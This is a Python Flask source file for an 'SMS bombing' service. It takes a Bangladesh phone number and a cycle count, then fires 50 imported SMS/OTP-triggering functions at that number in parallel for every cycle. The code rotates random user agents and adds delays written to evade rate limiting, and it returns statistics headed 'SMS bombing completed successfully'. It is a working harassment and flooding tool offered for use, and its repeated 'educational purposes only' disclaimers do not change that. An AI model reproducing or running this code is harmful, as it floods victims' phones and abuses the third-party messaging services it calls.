import time
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify
from flask_cors import CORS
from fake_useragent import UserAgent

from api.utils import random_string
from api.batch1 import *
from api.batch2 import *
from api.batch3 import *
from api.batch4 import *
from api.batch5 import *

app = Flask(__name__)
CORS(app)

# Proxy list (for educational purposes)
PROXY_LIST = [
    None,  # Direct connection
    # Add more proxies if needed
]

# User agent generator
ua = UserAgent()

def get_random_headers():
    """Generate random headers for requests"""
    return {
        'User-Agent': ua.random,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    }

# List of all API functions with their metadata
API_FUNCTIONS = [
    (api_1, "API-1", "Standard SMS"),
    (api_2, "API-2", "Flash SMS"),
    (api_3, "API-3", "Marketing SMS"),
    (api_4, "API-4", "Transactional SMS"),
    (api_5, "API-5", "Promotional SMS"),
    (api_6, "API-6", "Bulk SMS"),
    (api_7, "API-7", "OTP SMS"),
    (api_8, "API-8", "Voice SMS"),
    (api_9, "API-9", "International SMS"),
    (api_10, "API-10", "Premium SMS"),
    (api_11, "API-11", "Short Code SMS"),
    (api_12, "API-12", "Long Code SMS"),
    (api_13, "API-13", "Scheduled SMS"),
    (api_14, "API-14", "Auto-reply SMS"),
    (api_15, "API-15", "Two-way SMS"),
    (api_16, "API-16", "Group SMS"),
    (api_17, "API-17", "Template SMS"),
    (api_18, "API-18", "Custom SMS"),
    (api_19, "API-19", "Dynamic SMS"),
    (api_20, "API-20", "Survey SMS"),
    (api_21, "API-21", "Alert SMS"),
    (api_22, "API-22", "Notification SMS"),
    (api_23, "API-23", "Reminder SMS"),
    (api_24, "API-24", "Confirmation SMS"),
    (api_25, "API-25", "Verification SMS"),
    (api_26, "API-26", "Authentication SMS"),
    (api_27, "API-27", "Password Reset SMS"),
    (api_28, "API-28", "Order SMS"),
    (api_29, "API-29", "Delivery SMS"),
    (api_30, "API-30", "Tracking SMS"),
    (api_31, "API-31", "Location SMS"),
    (api_32, "API-32", "Emergency SMS"),
    (api_33, "API-33", "Broadcast SMS"),
    (api_34, "API-34", "Interactive SMS"),
    (api_35, "API-35", "Keyword SMS"),
    (api_36, "API-36", "Opt-in SMS"),
    (api_37, "API-37", "Opt-out SMS"),
    (api_38, "API-38", "Subscription SMS"),
    (api_39, "API-39", "Unsubscribe SMS"),
    (api_40, "API-40", "Campaign SMS"),
    (api_41, "API-41", "Analytics SMS"),
    (api_42, "API-42", "Report SMS"),
    (api_43, "API-43", "Dashboard SMS"),
    (api_44, "API-44", "API SMS"),
    (api_45, "API-45", "Webhook SMS"),
    (api_46, "API-46", "Callback SMS"),
    (api_47, "API-47", "Web SMS"),
    (api_48, "API-48", "Mobile SMS"),
    (api_49, "API-49", "Desktop SMS"),
    (api_50, "API-50", "Cloud SMS")
]

def call_single_api(api_func, api_name, api_type, number, pgen=None, egen=None, did=None, did2=None, name=None):
    """Execute a single API call with proper parameters and random headers"""
    try:
        # Add random delay to avoid rate limiting (50-200ms)
        time.sleep(random.uniform(0.05, 0.2))
        
        # Handle APIs with different parameter requirements
        if api_func in [api_9]:
            result = api_func(number, pgen, egen, did, name)
        elif api_func in [api_31]:
            result = api_func(number, egen, name)
        elif api_func in [api_33]:
            result = api_func(number, pgen, name)
        elif api_func in [api_37, api_39]:
            result = api_func(number, pgen, egen, name)
        else:
            result = api_func(number)
        
        # Check if request was successful
        if result and hasattr(result, 'status_code'):
            success = result.status_code == 200
            status_code = result.status_code
            response_time = getattr(result, 'elapsed', None)
            response_time_ms = response_time.total_seconds() * 1000 if response_time else 0
            
            return {
                "success": success,
                "status_code": status_code,
                "api_name": api_name,
                "api_type": api_type,
                "response_time_ms": round(response_time_ms, 2)
            }
        
        return {
            "success": False, 
            "status_code": "N/A",
            "api_name": api_name,
            "api_type": api_type,
            "error": "No response"
        }
        
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "api_name": api_name,
            "api_type": api_type,
            "status_code": "Error"
        }

def execute_bombing(number, req_count):
    """Execute bombing requests with detailed statistics and formatted response"""
    all_results = []
    working_apis = []
    failed_apis = []
    total_api_calls = 0
    successful_calls = 0
    total_response_time = 0
    
    start_time = time.time()
    
    for cycle in range(req_count):
        # Generate random strings for each cycle
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        
        cycle_success = 0
        cycle_results = []
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for api_func, api_name, api_type in API_FUNCTIONS:
                future = executor.submit(
                    call_single_api, 
                    api_func, api_name, api_type,
                    number, pgen, egen, did, None, name
                )
                futures.append(future)
            
            for future in futures:
                result = future.result()
                total_api_calls += 1
                total_response_time += result.get("response_time_ms", 0)
                
                if result.get("success"):
                    successful_calls += 1
                    cycle_success += 1
                    if result["api_name"] not in [a["name"] for a in working_apis]:
                        working_apis.append({
                            "name": result["api_name"],
                            "type": result["api_type"],
                            "status_code": result["status_code"]
                        })
                else:
                    if result["api_name"] not in [a["name"] for a in failed_apis]:
                        failed_apis.append({
                            "name": result["api_name"],
                            "type": result["api_type"],
                            "error": result.get("error", "Unknown error")
                        })
                
                cycle_results.append(result)
        
        all_results.append({
            "cycle": cycle + 1,
            "successful": cycle_success,
            "failed": len(API_FUNCTIONS) - cycle_success,
            "success_rate": round((cycle_success / len(API_FUNCTIONS)) * 100, 2),
            "details": cycle_results[:5]  # Show first 5 results for brevity
        })
        
        # Add delay between cycles (except after last cycle)
        if cycle < req_count - 1:
            time.sleep(2)
    
    # Calculate statistics
    execution_time = time.time() - start_time
    success_rate = (successful_calls / total_api_calls * 100) if total_api_calls > 0 else 0
    avg_response_time = (total_response_time / total_api_calls) if total_api_calls > 0 else 0
    
    # Prepare formatted response
    response = {
        "status": "success",
        "message": "SMS bombing completed successfully",
        "target": {
            "phone_number": number,
            "number_digits": len(number),
            "country_code": "+88" if number.startswith('01') else "Unknown"
        },
        "execution": {
            "total_cycles": req_count,
            "total_api_calls": total_api_calls,
            "execution_time_seconds": round(execution_time, 2),
            "average_response_time_ms": round(avg_response_time, 2)
        },
        "statistics": {
            "successful_calls": successful_calls,
            "failed_calls": total_api_calls - successful_calls,
            "success_rate": round(success_rate, 2),
            "working_apis": len(working_apis),
            "failed_apis": len(failed_apis)
        },
        "api_status": {
            "working": working_apis[:10],  # Show first 10 working APIs
            "failed": failed_apis[:10]      # Show first 10 failed APIs
        },
        "cycles": all_results,
        "disclaimer": "⚠️ This tool is for educational purposes only. Use responsibly and only with permission."
    }
    
    # Add summary of working/failed APIs if not too many
    if len(working_apis) > 10:
        response["api_status"]["working_summary"] = f"and {len(working_apis) - 10} more APIs"
    if len(failed_apis) > 10:
        response["api_status"]["failed_summary"] = f"and {len(failed_apis) - 10} more APIs"
    
    return response

@app.route('/', methods=['GET'])
def root():
    # Get parameters
    number = request.args.get('number')
    req_count = request.args.get('req')
    format_type = request.args.get('format', 'json')  # json or pretty
    
    # If no parameters provided, show usage guide
    if number is None and req_count is None:
        return jsonify({
            "status": "error",
            "error_code": "MISSING_PARAMETERS",
            "message": "Please provide required parameters",
            "usage": {
                "endpoint": "/?number=017xxxxxxxx&req=1",
                "example": "/?number=01712345678&req=5",
                "format": "&format=pretty (optional)"
            },
            "parameters": {
                "number": {
                    "description": "Bangladesh phone number",
                    "format": "11 digits without +88",
                    "example": "01712345678",
                    "required": True
                },
                "req": {
                    "description": "Number of cycles",
                    "format": "integer (1 to unlimited)",
                    "example": "5",
                    "default": 1,
                    "required": False
                },
                "format": {
                    "description": "Response format",
                    "options": ["json", "pretty"],
                    "default": "json",
                    "required": False
                }
            },
            "disclaimer": "⚠️ EDUCATIONAL PURPOSE ONLY - Use responsibly"
        }), 400
    
    # Validate number
    if not number:
        return jsonify({
            "status": "error",
            "error_code": "MISSING_NUMBER",
            "message": "Please provide 'number' parameter",
            "example": "/?number=01712345678&req=1"
        }), 400
    
    # Validate number format
    number = str(number).strip()
    if not number.isdigit():
        return jsonify({
            "status": "error",
            "error_code": "INVALID_NUMBER_FORMAT",
            "message": "Number must contain only digits",
            "provided": number,
            "example": "01712345678"
        }), 400
    
    if len(number) != 11:
        return jsonify({
            "status": "error",
            "error_code": "INVALID_NUMBER_LENGTH",
            "message": f"Number must be exactly 11 digits (provided: {len(number)} digits)",
            "provided": number,
            "example": "01712345678"
        }), 400
    
    if not number.startswith('01'):
        return jsonify({
            "status": "error",
            "error_code": "INVALID_NUMBER_PREFIX",
            "message": "Number must start with '01' for Bangladesh numbers",
            "provided": number,
            "example": "01712345678"
        }), 400
    
    # Validate request count
    if not req_count:
        req_count = 1
    else:
        try:
            req_count = int(req_count)
            if req_count < 1:
                req_count = 1
            if req_count > 100:
                return jsonify({
                    "status": "error",
                    "error_code": "REQUEST_LIMIT_EXCEEDED",
                    "message": "Maximum 100 cycles allowed for safety",
                    "provided": req_count,
                    "max_allowed": 100
                }), 400
        except ValueError:
            return jsonify({
                "status": "error",
                "error_code": "INVALID_REQUEST_COUNT",
                "message": "'req' must be a valid number",
                "provided": req_count,
                "example": 5
            }), 400
    
    try:
        # Execute bombing
        result = execute_bombing(number, req_count)
        
        # Format response if pretty format requested
        if format_type == 'pretty':
            return app.response_class(
                response=jsonify(result).get_data(as_text=True),
                status=200,
                mimetype='application/json'
            )
        
        return jsonify(result), 200
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "error_code": "EXECUTION_FAILED",
            "message": "Failed to execute SMS bombing",
            "details": str(e) if app.debug else "Internal server error",
            "suggestion": "Please try again with different parameters"
        }), 500

# Health check endpoint
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "service": "SMS API Service",
        "version": "2.0",
        "total_apis": len(API_FUNCTIONS),
        "timestamp": time.time()
    }), 200

# API info endpoint
@app.route('/info', methods=['GET'])
def api_info():
    return jsonify({
        "service": "Educational SMS API Service",
        "purpose": "Educational demonstration only",
        "total_apis": len(API_FUNCTIONS),
        "api_list": [{"name": name, "type": api_type} for _, name, api_type in API_FUNCTIONS],
        "features": [
            "Multi-threaded requests",
            "Random user agents",
            "Response statistics",
            "Cycle tracking",
            "Success rate calculation"
        ],
        "disclaimer": "⚠️ FOR EDUCATIONAL PURPOSES ONLY"
    }), 200

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "status": "error",
        "error_code": "INVALID_PATH",
        "message": "Endpoint not found",
        "available_endpoints": [
            "/ - Main endpoint (use with ?number=xxx&req=xx)",
            "/health - Health check",
            "/info - API information"
        ]
    }), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        "status": "error",
        "error_code": "INTERNAL_SERVER_ERROR",
        "message": "Internal server error occurred",
        "suggestion": "Please try again later or check your parameters"
    }), 500

if __name__ == '__main__':
    print("=" * 50)
    print("Educational SMS API Service")
    print("=" * 50)
    print(f"Total APIs loaded: {len(API_FUNCTIONS)}")
    print(f"Server running on: http://0.0.0.0:5000")
    print(f"Health check: http://0.0.0.0:5000/health")
    print(f"API info: http://0.0.0.0:5000/info")
    print("=" * 50)
    print("⚠️  EDUCATIONAL PURPOSE ONLY")
    print("⚠️  Use responsibly and with permission")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
